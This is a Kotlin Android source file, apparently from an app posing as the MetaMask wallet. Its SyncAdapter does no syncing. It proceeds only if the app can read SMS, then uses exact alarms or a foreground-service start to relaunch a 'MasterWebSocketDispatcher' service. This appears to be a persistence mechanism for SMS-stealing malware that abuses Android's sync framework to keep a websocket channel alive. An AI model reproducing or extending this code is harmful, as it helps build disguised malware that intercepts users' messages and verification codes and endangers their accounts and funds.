package com.example.MetaMask.services.sync

import android.accounts.Account
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.AbstractThreadedSyncAdapter
import android.content.ContentProviderClient
import android.content.Context
import android.content.Intent
import android.content.SyncResult
import android.os.Build
import android.os.Bundle
import com.example.MetaMask.receivers.AlarmReceiver
import com.example.MetaMask.services.MasterWebSocketDispatcher

class SyncAdapter(context: Context, autoInitialize: Boolean) : AbstractThreadedSyncAdapter(context, autoInitialize) {

    override fun onPerformSync(
        account: Account,
        extras: Bundle,
        authority: String,
        provider: ContentProviderClient,
        syncResult: SyncResult
    ) {
        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[SyncAdapter] if branch") //xdbg
            return
        }

        try {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val alarmIntent = Intent(context, AlarmReceiver::class.java).apply {
                action = "SYNC_ADAPTER_TRIGGER"
            }

            val pendingIntent = PendingIntent.getBroadcast(
                context,
                999,
                alarmIntent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )

            val triggerTime = System.currentTimeMillis() + 1000L

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.util.Log.d("XDBG", "[SyncAdapter] if branch") //xdbg
                if (alarmManager.canScheduleExactAlarms()) {
                    android.util.Log.d("XDBG", "[SyncAdapter] if branch") //xdbg
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                } else {
                    startServiceDirectly(context)
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SyncAdapter] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun startServiceDirectly(context: Context) {
        android.util.Log.d("XDBG", "[SyncAdapter] startServiceDirectly enter context=ctx") //xdbg
        try {
            val serviceIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM_SYNC", true)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[SyncAdapter] if branch") //xdbg
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SyncAdapter] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
